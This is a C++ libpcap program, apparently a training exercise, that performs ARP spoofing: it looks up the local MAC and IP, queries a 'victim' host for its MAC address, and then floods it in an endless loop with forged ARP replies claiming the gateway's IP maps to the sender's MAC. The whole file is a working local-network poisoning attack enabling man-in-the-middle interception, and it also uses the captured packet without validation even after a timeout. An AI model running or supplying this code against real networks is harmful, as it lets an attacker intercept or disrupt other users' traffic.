#include <cstdio>
#include <pcap.h>
#include <string>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender-ip> <target-ip>\n");
	printf("sample: send-arp-test wlan0 192.168.0.31 192.168.0.1\n");
}

void getMacAddress(const char* ifaceName, char* macAddressStr) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("Error opening socket");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);
    

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("Error getting MAC address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    close(sockfd);

    unsigned char* macAddress = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(macAddressStr, "%02X:%02X:%02X:%02X:%02X:%02X",
             macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);
     
    
}

void getIPAddress(const char* ifaceName, char* ipAddressStr) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("Error opening socket");
        exit(EXIT_FAILURE);
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        perror("Error getting IP address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    close(sockfd);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    const char* ipAddress = inet_ntop(AF_INET, &ipaddr->sin_addr, ipAddressStr, INET_ADDRSTRLEN);
    if (ipAddress == NULL) {
        perror("Error converting IP address");
        exit(EXIT_FAILURE);
    }
    
    //printf("%s\n", ipAddress);
    strcpy(ipAddressStr, ipAddress);
    
}

int main(int argc, char* argv[]) {
	//printf("start main");
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	// printf("%s\n", dev);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	const char* ifname = dev;
	char macaddr[18];
	char ipaddr[20];
	
	//printf("before get()");
	getMacAddress(ifname, macaddr);
	
	getIPAddress(ifname, ipaddr);
	
	printf("%s\n", macaddr);
	printf("%s\n", ipaddr);
	
	
	// send arp request to victim
	
	EthArpPacket reqpacket;

	reqpacket.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	reqpacket.eth_.smac_ = Mac(macaddr);
	reqpacket.eth_.type_ = htons(EthHdr::Arp);

	reqpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	reqpacket.arp_.pro_ = htons(EthHdr::Ip4);
	reqpacket.arp_.hln_ = Mac::SIZE;
	reqpacket.arp_.pln_ = Ip::SIZE;
	reqpacket.arp_.op_ = htons(ArpHdr::Request);
	reqpacket.arp_.smac_ = Mac(macaddr); // source mac (self)
	reqpacket.arp_.sip_ = htonl(Ip(ipaddr)); // source ip (self)
	reqpacket.arp_.tmac_ = Mac("00:00:00:00:00:00"); // target mac (00:)
	reqpacket.arp_.tip_ = htonl(Ip(argv[2])); // victim ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reqpacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	
	// ARP response packet from victim
	struct pcap_pkthdr* header;
	const u_char* packet;
	EthArpPacket* respacket;
	int timeout_ms = 1000; // 타임아웃을 1000ms로 설정
	int ret = pcap_next_ex(handle, &header, &packet);
	printf("%d\n", ret);
	if (ret == 1) { // 패킷을 정상적으로 수신한 경우
		respacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
		// 수신한 ARP 응답 패킷에서 필요한 정보를 추출하여 사용
	} else { // 타임아웃이 발생한 경우
		puts("Timeout occurred.");
	}
	
	//printf("victim res eth dmac: %s\n", respacket->eth_.dmac_.ToString().c_str());
	// printf("victim res eth smac: %s\n", respacket->eth_.smac_.ToString().c_str());
	
	// arp spoof to victim
	 while(1) {
		EthArpPacket atkpacket;

		atkpacket.eth_.dmac_ = respacket->eth_.smac_;
		atkpacket.eth_.smac_ = Mac(macaddr);
		atkpacket.eth_.type_ = htons(EthHdr::Arp);

		atkpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
		atkpacket.arp_.pro_ = htons(EthHdr::Ip4);
		atkpacket.arp_.hln_ = Mac::SIZE;
		atkpacket.arp_.pln_ = Ip::SIZE;
		atkpacket.arp_.op_ = htons(ArpHdr::Reply);
		atkpacket.arp_.smac_ = Mac(macaddr); // source mac (self)
		atkpacket.arp_.sip_ = htonl(Ip(argv[3])); // source ip (target IP)
		atkpacket.arp_.tmac_ = respacket->eth_.smac_;
		atkpacket.arp_.tip_ = htonl(Ip(argv[2])); // victim ip

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atkpacket), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		
	}
	

	pcap_close(handle);
}


